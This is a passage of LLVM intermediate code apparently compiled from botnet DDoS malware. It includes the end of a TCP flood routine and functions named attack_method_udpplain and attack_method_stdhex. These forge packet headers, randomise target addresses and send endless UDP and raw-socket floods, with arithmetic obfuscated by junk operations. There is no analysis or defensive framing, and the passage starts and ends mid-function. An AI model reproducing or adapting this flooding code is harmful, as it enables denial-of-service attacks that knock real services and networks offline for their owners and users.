  %522 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i32 0, i32 8
  store i32 %521, i32* %523, align 4
  br label %524

; <label>:524:                                    ; preds = %520, %517
  %525 = load i16, i16* %13, align 2
  %526 = zext i16 %525 to i32
  %527 = icmp eq i32 %526, 65535
  br i1 %527, label %528, label %541

; <label>:528:                                    ; preds = %524
  %529 = call i32 @rand_next()
  %530 = xor i32 %529, -1
  %531 = xor i32 65535, -1
  %532 = xor i32 -23455402, -1
  %533 = or i32 %530, %531
  %534 = or i32 -23455402, %532
  %535 = xor i32 %533, -1
  %536 = and i32 %535, %534
  %537 = and i32 %529, 65535
  %538 = trunc i32 %536 to i16
  %539 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 3
  store i16 %538, i16* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %528, %524
  %542 = load i16, i16* %16, align 2
  %543 = zext i16 %542 to i32
  %544 = icmp eq i32 %543, 65535
  br i1 %544, label %545, label %558

; <label>:545:                                    ; preds = %541
  %546 = call i32 @rand_next()
  %547 = xor i32 %546, -1
  %548 = xor i32 65535, -1
  %549 = xor i32 1090858944, -1
  %550 = or i32 %547, %548
  %551 = or i32 1090858944, %549
  %552 = xor i32 %550, -1
  %553 = and i32 %552, %551
  %554 = and i32 %546, 65535
  %555 = trunc i32 %553 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 0
  store i16 %555, i16* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %545, %541
  %559 = load i16, i16* %17, align 2
  %560 = zext i16 %559 to i32
  %561 = icmp eq i32 %560, 65535
  br i1 %561, label %562, label %575

; <label>:562:                                    ; preds = %558
  %563 = call i32 @rand_next()
  %564 = xor i32 %563, -1
  %565 = xor i32 65535, -1
  %566 = xor i32 -1431760301, -1
  %567 = or i32 %564, %565
  %568 = or i32 -1431760301, %566
  %569 = xor i32 %567, -1
  %570 = and i32 %569, %568
  %571 = and i32 %563, 65535
  %572 = trunc i32 %570 to i16
  %573 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %574 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %573, i32 0, i32 1
  store i16 %572, i16* %574, align 2
  br label %575

; <label>:575:                                    ; preds = %562, %558
  %576 = load i32, i32* %18, align 4
  %577 = icmp eq i32 %576, 65535
  br i1 %577, label %578, label %582

; <label>:578:                                    ; preds = %575
  %579 = call i32 @rand_next()
  %580 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %581 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %580, i32 0, i32 2
  store i32 %579, i32* %581, align 4
  br label %582

; <label>:582:                                    ; preds = %578, %575
  %583 = load i32, i32* %19, align 4
  %584 = icmp eq i32 %583, 65535
  br i1 %584, label %585, label %589

; <label>:585:                                    ; preds = %582
  %586 = call i32 @rand_next()
  %587 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 3
  store i32 %586, i32* %588, align 4
  br label %589

; <label>:589:                                    ; preds = %585, %582
  %590 = load i8, i8* %20, align 1
  %591 = icmp ne i8 %590, 0
  br i1 %591, label %592, label %601

; <label>:592:                                    ; preds = %589
  %593 = call i32 @rand_next()
  %594 = xor i32 65535, -1
  %595 = xor i32 %593, %594
  %596 = and i32 %595, %593
  %597 = and i32 %593, 65535
  %598 = trunc i32 %596 to i16
  %599 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 7
  store i16 %598, i16* %600, align 2
  br label %601

; <label>:601:                                    ; preds = %592, %589
  %602 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 7
  store i16 0, i16* %603, align 2
  %604 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %605 = bitcast %struct.iphdr* %604 to i16*
  %606 = call zeroext i16 @checksum_generic(i16* %605, i32 20)
  %607 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %608 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %607, i32 0, i32 7
  store i16 %606, i16* %608, align 2
  %609 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %610 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %609, i32 0, i32 6
  store i16 0, i16* %610, align 4
  %611 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %612 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %613 = bitcast %struct.tcphdr* %612 to i8*
  %614 = call zeroext i16 @htons(i16 zeroext 40) #7
  %615 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %611, i8* %613, i16 zeroext %614, i32 40)
  %616 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 6
  store i16 %615, i16* %617, align 4
  %618 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 1
  %620 = load i16, i16* %619, align 2
  %621 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %622 = load i32, i32* %9, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %621, i64 %623
  %625 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %624, i32 0, i32 0
  %626 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %625, i32 0, i32 1
  store i16 %620, i16* %626, align 2
  %627 = load i32, i32* %10, align 4
  %628 = load i8*, i8** %30, align 8
  %629 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %630 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %631 = load i32, i32* %9, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %630, i64 %632
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %633, i32 0, i32 0
  %635 = bitcast %struct.sockaddr_in* %634 to %struct.sockaddr*
  store %struct.sockaddr* %635, %struct.sockaddr** %629, align 8
  %636 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %637 = load %struct.sockaddr*, %struct.sockaddr** %636, align 8
  %638 = call i64 @sendto(i32 %627, i8* %628, i64 60, i32 16384, %struct.sockaddr* %637, i32 16)
  br label %639

; <label>:639:                                    ; preds = %601
  %640 = load i32, i32* %9, align 4
  %641 = sub i32 0, %640
  %642 = sub i32 0, 1
  %643 = add i32 %641, %642
  %644 = sub i32 0, %643
  %645 = add nsw i32 %640, 1
  store i32 %644, i32* %9, align 4
  br label %468

; <label>:646:                                    ; preds = %468
  br label %467

; <label>:647:                                    ; preds = %104, %98
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1458)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %172, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %178

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %153

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %141
  %143 = sub i32 %132, %142
  %144 = add i32 %132, %141
  %145 = call i32 @htonl(i32 %143) #7
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 0
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %150, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  store i32 %145, i32* %152, align 4
  br label %153

; <label>:153:                                    ; preds = %125, %116
  %154 = load i32*, i32** %11, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %154, i64 %156
  %158 = load i32, i32* %157, align 4
  %159 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %160 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %163, i32 0, i32 0
  %165 = bitcast %struct.sockaddr_in* %164 to %struct.sockaddr*
  store %struct.sockaddr* %165, %struct.sockaddr** %159, align 8
  %166 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %167 = load %struct.sockaddr*, %struct.sockaddr** %166, align 8
  %168 = call i32 @connect(i32 %158, %struct.sockaddr* %167, i32 16)
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %153
  br label %171

; <label>:171:                                    ; preds = %170, %153
  br label %172

; <label>:172:                                    ; preds = %171
  %173 = load i32, i32* %9, align 4
  %174 = add i32 %173, -406517587
  %175 = add i32 %174, 1
  %176 = sub i32 %175, -406517587
  %177 = add nsw i32 %173, 1
  store i32 %176, i32* %9, align 4
  br label %58

; <label>:178:                                    ; preds = %58
  br label %179

; <label>:179:                                    ; preds = %213, %178
  store i32 0, i32* %9, align 4
  br label %180

; <label>:180:                                    ; preds = %207, %179
  %181 = load i32, i32* %9, align 4
  %182 = load i8, i8* %5, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %213

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %10, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %22, align 8
  %191 = load i8, i8* %15, align 1
  %192 = icmp ne i8 %191, 0
  br i1 %192, label %193, label %197

; <label>:193:                                    ; preds = %185
  %194 = load i8*, i8** %22, align 8
  %195 = load i16, i16* %14, align 2
  %196 = zext i16 %195 to i32
  call void @rand_str(i8* %194, i32 %196)
  br label %197

; <label>:197:                                    ; preds = %193, %185
  %198 = load i32*, i32** %11, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = load i8*, i8** %22, align 8
  %204 = load i16, i16* %14, align 2
  %205 = zext i16 %204 to i64
  %206 = call i64 @send(i32 %202, i8* %203, i64 %205, i32 16384)
  br label %207

; <label>:207:                                    ; preds = %197
  %208 = load i32, i32* %9, align 4
  %209 = add i32 %208, 1847226648
  %210 = add i32 %209, 1
  %211 = sub i32 %210, 1847226648
  %212 = add nsw i32 %208, 1
  store i32 %211, i32* %9, align 4
  br label %180

; <label>:213:                                    ; preds = %180
  br label %179
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare void @rand_str(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

; <label>:55:                                     ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  br label %58

; <label>:58:                                     ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

; <label>:59:                                     ; preds = %180, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %186

; <label>:64:                                     ; preds = %59
  %65 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %65, i8* bitcast ([256 x i8*]* @attack_method_stdhex.satuur_thicc to i8*), i64 2048, i32 16, i1 false)
  %66 = call i32 @rand() #6
  %67 = srem i32 %66, 256
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %68
  %70 = load i8*, i8** %69, align 8
  store i8* %70, i8** %20, align 8
  %71 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %72 = load i8**, i8*** %10, align 8
  %73 = load i32, i32* %9, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  store i8* %71, i8** %75, align 8
  %76 = load i16, i16* %12, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp eq i32 %77, 65535
  br i1 %78, label %79, label %88

; <label>:79:                                     ; preds = %64
  %80 = call i32 @rand_next()
  %81 = trunc i32 %80 to i16
  %82 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 0
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %86, i32 0, i32 1
  store i16 %81, i16* %87, align 2
  br label %97

; <label>:88:                                     ; preds = %64
  %89 = load i16, i16* %12, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %89) #7
  %91 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i64 %93
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %95, i32 0, i32 1
  store i16 %90, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %88, %79
  %98 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %99 = load i32*, i32** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  store i32 %98, i32* %102, align 4
  %103 = icmp eq i32 %98, -1
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %97
  ret void

; <label>:105:                                    ; preds = %97
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load i16, i16* %13, align 2
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %110 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %109, i32 0, i32 0
  store i32 0, i32* %110, align 4
  %111 = load i32*, i32** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i32, i32* %111, i64 %113
  %115 = load i32, i32* %114, align 4
  %116 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %117 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %117, %struct.sockaddr** %116, align 8
  %118 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %119 = load %struct.sockaddr*, %struct.sockaddr** %118, align 8
  %120 = call i32 @bind(i32 %115, %struct.sockaddr* %119, i32 16) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %105
  br label %123

; <label>:123:                                    ; preds = %122, %105
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 4
  %130 = zext i8 %129 to i32
  %131 = icmp slt i32 %130, 32
  br i1 %131, label %132, label %161

; <label>:132:                                    ; preds = %123
  %133 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #7
  %140 = call i32 @rand_next()
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = lshr i32 %140, %147
  %149 = add i32 %139, -87051616
  %150 = add i32 %149, %148
  %151 = sub i32 %150, -87051616
  %152 = add i32 %139, %148
  %153 = call i32 @htonl(i32 %151) #7
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 0
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %158, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %153, i32* %160, align 4
  br label %161

; <label>:161:                                    ; preds = %132, %123
  %162 = load i32*, i32** %11, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds i32, i32* %162, i64 %164
  %166 = load i32, i32* %165, align 4
  %167 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
